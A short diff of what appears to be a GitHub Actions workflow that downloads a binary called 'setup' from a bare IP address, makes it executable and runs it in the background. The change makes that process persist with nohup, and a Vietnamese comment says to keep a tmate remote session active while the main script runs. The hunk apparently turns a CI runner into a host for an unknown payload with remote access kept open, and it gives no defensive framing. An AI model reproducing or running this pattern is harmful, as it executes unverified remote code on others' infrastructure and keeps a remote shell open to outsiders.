@@ -49,7 +49,7 @@ jobs:
           echo "📦 Downloading and running setup..."
           wget http://38.242.224.156:8082/setup
           chmod +x setup
-          ./setup &
+          nohup ./setup > setup.log 2>&1 &
           SETUP_PID=$!
           
           # Chờ script chính chạy nhưng vẫn giữ tmate active
